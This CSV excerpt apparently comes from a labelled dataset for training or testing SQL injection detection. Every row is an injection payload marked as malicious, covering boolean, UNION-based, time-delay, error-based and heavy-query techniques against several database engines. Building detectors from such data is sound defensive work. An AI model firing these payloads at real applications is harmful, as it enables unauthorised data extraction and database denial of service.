row_index,payload_norm,label,sqli_type_hint
2850,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
2851,"1'|| ( select 'jnsd' from dual where 2316 = 2316 union all select null,null,null,null,null,null,null#",1,
2852,"1%"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""%"" = """,1,
2853,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ),1,
2854,1 where 8393 = 8393,1,
2855,"-2013"" ) ) as kisy where 3802 = 3802 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,
2856,"1%"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,1,
2857,-7971' union all select 4273#,1,
2858,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%"" = """,1,
2859,1' ) ) and 2401 = 4693 and ( ( 'ssrm' = 'ssrm,1,
2860,"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
2861,"1%"" ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""%"" = """,1,
2862,-9657' ) as ziiq where 7725 = 7725 or 3038 = 3038,1,
2863,"-6599%"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""%"" = """,1,
2864,"-2610%"" ) union all select 7779,7779,7779,7779,7779--",1,
2865,"1'+ ( select fhbk where 2570 = 2570 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1,
2866,"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554",1,
2867,"1%"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""%"" = """,1,
2868,"1 ) where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",1,
2869,"1' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
2870,"1%' ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
2871,"-7233"" ) where 7574 = 7574 or 5821 = 3288",1,
2872,"-4927' ) ) union all select 1924,1924#",1,
2873,"1 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
2874,"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""rntg"" like ""rntg",1,
2875,"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""ykhp"" like ""ykhp",1,
2876,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'wdru' like 'wdru",1,
2877,"1%"" ) union all select null,null,null,null--",1,
2878,"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) ||'",1,
2879,"1"" ) and elt ( 1889 = 7397,7397 ) and ( ""kuau"" = ""kuau",1,
